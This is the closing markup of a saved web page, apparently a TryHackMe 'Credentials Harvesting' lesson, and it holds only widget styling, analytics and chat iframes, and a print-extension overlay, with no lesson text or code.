<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;" data-pf_style_display="block" data-pf_style_visibility="visible" data-pf_rect_width="2" data-pf_rect_height="0"><defs id="SvgjsDefs1002" data-pf_style_display="inline" data-pf_style_visibility="visible"></defs><polyline id="SvgjsPolyline1003" points="0,0" data-pf_style_display="inline" data-pf_style_visibility="visible"></polyline><path id="SvgjsPath1004" d="M0 0 " data-pf_style_display="inline" data-pf_style_visibility="visible"></path></svg><div id="87F0F0CE-DB4F-9DAF-BEC0-ED6C93689111" data-pf_style_display="block" data-pf_style_visibility="visible"></div><iframe id="_hjSafeContext_19693274" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Credentials Harvesting_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;" data-pf_style_display="none" data-pf_style_visibility="visible" data-pf_rect_width="0" data-pf_rect_height="0" class="hidden-originally"></iframe><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" data-pf_style_display="block" data-pf_style_visibility="visible" data-pf_rect_width="1" data-pf_rect_height="1" src="./TryHackMe _ Credentials Harvesting_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open" data-pf_style_display="flex" data-pf_style_visibility="visible"><img src="./TryHackMe _ Credentials Harvesting_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open" data-pf_style_display="block" data-pf_style_visibility="visible" data-pf_rect_width="24" data-pf_rect_height="24"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize" data-pf_style_display="flex" data-pf_style_visibility="visible"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-pf_style_display="block" data-pf_style_visibility="visible" data-pf_rect_width="0" data-pf_rect_height="0">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white" data-pf_style_display="inline" data-pf_style_visibility="visible"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div><div id="pf-mask" style="z-index: 2147483627!important; position: fixed !important; top: 0pt !important; left: 0pt !important; background-color: rgb(0, 0, 0) !important; opacity: 0.8 !important;filter:progid:DXImageTransform.Microsoft.Alpha(opacity=80); height: 100% !important; width: 100% !important;"></div><iframe frameborder="0" id="pf-core" name="pf-core" src="chrome-extension://ohlencieiipommannpdfcmfdpjjmeolj/core.html" style="width: 100% !important; max-width: 100vw !important; height: 100% !important; max-height: 100vh !important; display: block !important; overflow: hidden !important; position: absolute !important; top: 0px !important; left: 0px !important; background-color: transparent !important; z-index: 2147483647 !important;"></iframe></body></html>